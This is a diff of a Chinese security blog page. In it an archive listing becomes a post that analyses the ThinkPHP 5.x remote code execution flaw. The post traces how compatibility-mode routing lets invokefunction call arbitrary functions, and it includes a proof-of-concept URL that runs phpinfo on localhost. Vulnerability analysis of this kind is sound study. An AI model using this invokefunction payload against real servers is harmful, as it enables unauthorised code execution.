@@ -3,17 +3,21 @@
 <head>
     <meta charset="utf-8">
     
-    <title>Archive: 2018/9 | Math &amp; Sec ，CHP的个人博客</title>
+    <title>Thinkphp 5.x RCE漏洞 | Math &amp; Sec ，CHP的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="记录追逐时间的points与闪现的ideas。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Math &amp; Sec ，CHP的个人博客">
-<meta property="og:url" content="http://hachp1.github.io/archives/2018/09/index.html">
+    <meta name="description" content="Thinkphp 5.x RCE漏洞 0x0 概要 Thinkphp为MVC处理结构，通过对路由的解析，使用控制器调用函数。 由于对兼容模式的路由处理没有进行过滤等，可以调用命名空间下的任意函数，从而产生了RCE漏洞。 0x1 基础知识 Thinkphp 兼容模式 兼容模式是用于不支持PATHINFO的特殊环境，使用时，URL地址形如：  http://localhost/?s=/">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Thinkphp 5.x RCE漏洞">
+<meta property="og:url" content="http://hachp1.github.io/posts/Web安全/20190124-5.x RCE.html">
 <meta property="og:site_name" content="Math &amp; Sec ，CHP的个人博客">
-<meta property="og:description" content="记录追逐时间的points与闪现的ideas。">
+<meta property="og:description" content="Thinkphp 5.x RCE漏洞 0x0 概要 Thinkphp为MVC处理结构，通过对路由的解析，使用控制器调用函数。 由于对兼容模式的路由处理没有进行过滤等，可以调用命名空间下的任意函数，从而产生了RCE漏洞。 0x1 基础知识 Thinkphp 兼容模式 兼容模式是用于不支持PATHINFO的特殊环境，使用时，URL地址形如：  http://localhost/?s=/">
+<meta property="og:image" content="http://120.78.185.175/img/thumbnails/">
+<meta property="og:updated_time" content="2019-01-23T16:23:11.420Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Math &amp; Sec ，CHP的个人博客">
-<meta name="twitter:description" content="记录追逐时间的points与闪现的ideas。">
+<meta name="twitter:title" content="Thinkphp 5.x RCE漏洞">
+<meta name="twitter:description" content="Thinkphp 5.x RCE漏洞 0x0 概要 Thinkphp为MVC处理结构，通过对路由的解析，使用控制器调用函数。 由于对兼容模式的路由处理没有进行过滤等，可以调用命名空间下的任意函数，从而产生了RCE漏洞。 0x1 基础知识 Thinkphp 兼容模式 兼容模式是用于不支持PATHINFO的特殊环境，使用时，URL地址形如：  http://localhost/?s=/">
+<meta name="twitter:image" content="http://120.78.185.175/img/thumbnails/">
     
 
     
@@ -178,50 +182,157 @@
 </aside>
 
             
-            <section id="main"><div class="timeline timeline-wrap">
-    
-            <div class="timeline-row timeline-row-major">
-                <span class="node"><i class="fa fa-calendar"></i></span>
-                <h1 class="title">2018</h1>
-            </div>
+            <section id="main"><article id="post-thinkphp-5-x-RCE漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
         
-        <div class="timeline-row">
-            <span class="node"></span>
-            <div class="content">
+            
+	
+		<img src="http://120.78.185.175/img/banner/websec.png" class="article-banner" />
+	
+
+
+
+        
+        
+            <header class="article-header">
                 
     
-        <h1 itemprop="name">
-            <a class="timeline-article-title" href="/posts/Web安全/20180922-Websec2.html">2018省赛AWD web writeup</a>
+        <h1 class="article-title" itemprop="name">
+            Thinkphp 5.x RCE漏洞
         </h1>
     
 
-                <div class="article-meta">
-                    
+                
+                    <div class="article-meta">
+                        
     <div class="article-date">
         <i class="fa fa-calendar"></i>
-        <a href="/posts/Web安全/20180922-Websec2.html">
-            <time datetime="2018-09-22T06:50:50.000Z" itemprop="datePublished">2018-09-22</time>
+        <a href="/posts/Web安全/20190124-5.x RCE.html">
+            <time datetime="2019-01-23T16:04:00.000Z" itemprop="datePublished">2019-01-24</time>
         </a>
     </div>
 
 
-                    
+                        
     <div class="article-category">
     	<i class="fa fa-folder"></i>
         <a class="article-category-link" href="/categories/Web安全/">Web安全</a>
     </div>
 
-                    
+                        
     <div class="article-tag">
         <i class="fa fa-tag"></i>
         <a class="tag-link" href="/tags/Web安全/">Web安全</a>
     </div>
 
-                </div>
-            </div>
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+			<h1 id="thinkphp-5.x-rce漏洞">Thinkphp 5.x RCE漏洞</h1>
+<h2 id="x0-概要">0x0 概要</h2>
+<p>Thinkphp为MVC处理结构，通过对路由的解析，使用控制器调用函数。<br>
+由于对兼容模式的路由处理没有进行过滤等，可以调用命名空间下的任意函数，从而产生了RCE漏洞。</p>
+<h2 id="x1-基础知识">0x1 基础知识</h2>
+<h3 id="thinkphp-兼容模式">Thinkphp 兼容模式</h3>
+<p>兼容模式是用于不支持PATHINFO的特殊环境，使用时，URL地址形如：</p>
+<ul>
+<li>http://localhost/?s=/home/user/login/var/value 或</li>
+<li>?s=module/controller/action</li>
+</ul>
+<h3 id="thinkphp-app类的内置函数调用">Thinkphp App类的内置函数调用</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 执行函数或者闭包方法 支持参数调用</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span> string|array|\Closure $function 函数或者闭包</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span> array $vars 变量</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></div><div class="line"><span class="comment"> */</span> </div><div class="line"> App::invokeFunction($function, $vars = [])</div></pre></td></tr></table></figure>
+<h2 id="x2-代码追踪">0x2 代码追踪</h2>
+<p>按照爆出phpinfo的执行过程跟踪。 POC中，使用invokefunction函数对phpinfo进行调用，且解析url中的vars，将其传入phpinfo中，payload为： <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:801/cms/thinkphp/thinkphp_5.0.22/public/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=-1</div></pre></td></tr></table></figure></p>
+<p>首先需要对thinkphp的路由操作做分析。 传入兼容模式的s，所以是对s进行路由 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 未设置调度信息则进行 URL 路由检测</span></div><div class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</div><div class="line">                $dispatch = <span class="keyword">self</span>::routeCheck($request, $config);</div><div class="line">            &#125;</div></pre></td></tr></table></figure></p>
+<p>跟踪至函数内： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></div><div class="line">           $result = Route::check($request, $path, $depr, $config[<span class="string">'url_domain_deploy'</span>]);</div></pre></td></tr></table></figure></p>
+<p>进一步跟踪： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($url, <span class="string">'?'</span>)) &#123;</div><div class="line">           <span class="comment">// [模块/控制器/操作?]参数1=值1&amp;参数2=值2...</span></div><div class="line">           $info = parse_url($url);</div><div class="line">           $path = explode(<span class="string">'/'</span>, $info[<span class="string">'path'</span>]);</div><div class="line">           parse_str($info[<span class="string">'query'</span>], $var);</div><div class="line">       &#125; <span class="keyword">elseif</span> (strpos($url, <span class="string">'/'</span>)) &#123;</div><div class="line">           <span class="comment">// [模块/控制器/操作]</span></div><div class="line">           $path = explode(<span class="string">'/'</span>, $url);</div><div class="line">       &#125; <span class="keyword">else</span> &#123;</div><div class="line">           $path = [$url];</div><div class="line">       &#125;</div><div class="line">       <span class="keyword">return</span> [$path, $var];</div></pre></td></tr></table></figure></p>
+<p>可以看到，代码没有对操作做出任何过滤和检测，直接将模块、控制器（命名空间）和操作函数解析了。 运行到此处时，path已经被分割为三部分。 之后，代码就会执行解析好的函数： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$data = <span class="keyword">self</span>::exec($dispatch, $config);</div></pre></td></tr></table></figure></p>
+<p>执行函数 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</div><div class="line">           <span class="comment">// 执行操作方法</span></div><div class="line">           $call = [$instance, $action];</div><div class="line">           <span class="comment">// 严格获取当前操作方法名</span></div><div class="line">           $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</div><div class="line">           $methodName = $reflect-&gt;getName();</div><div class="line">           $suffix     = $config[<span class="string">'action_suffix'</span>];</div><div class="line">           $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</div><div class="line">           $request-&gt;action($actionName);</div><div class="line"></div><div class="line">       &#125;</div></pre></td></tr></table></figure></p>
+<p>此时，invokefunction已经将传入的函数执行。</p>
+<h2 id="x-3一些坑以及查阅资料得到">0x 3一些坑以及查阅资料得到</h2>
+<ul>
+<li>对于windows和linux系统，该漏洞的触发情况不一样，windows系统是对大小写敏感的，所以一些函数无法调用。</li>
+<li>在本机（windows系统）下测试网上的写入webshell和执行系统命令的POC都失败了，并且在跟踪的过程中发现源代码也不太一样，一是本地测试使用的5.0.22非完整版本，二是本地服务器的安全设置问题。</li>
+</ul>
+
+        
         </div>
-    
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more">分享到：</a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间">QQ空间</a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博">新浪微博</a>
+    <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博">腾讯微博</a>
+    <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网">人人网</a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信">微信</a>
 </div>
+<script>
+window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"share":{"bdSize":16}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+<style>
+    .bdshare_popup_box {
+        border-radius: 4px;
+        border: #e1e1e1 solid 1px;
+    }
+    .bdshare-button-style0-16 a,
+    .bdshare-button-style0-16 .bds_more {
+        padding-left: 20px;
+        margin: 6px 10px 6px 0;
+    }
+    .bdshare_dialog_list a,
+    .bdshare_popup_list a,
+    .bdshare_popup_bottom a {
+        font-family: 'Microsoft Yahei';
+    }
+    .bdshare_popup_top {
+        display: none;
+    }
+    .bdshare_popup_bottom {
+        height: auto;
+        padding: 5px;
+    }
+</style>
+
+
+</div>
+
+            
+    
+
+        </footer>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/posts/机器学习/20181204-treeAlgorithm.html" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">树相关-从决策树到kaggle大杀器</div>
+        </a>
+    
+</nav>
+
+
+    
+</article>
+
+
+    
+    
+        <section id="comments">
+    <div id="valine-thread"></div>
+</section>
+    
+
 </section>
             
                 
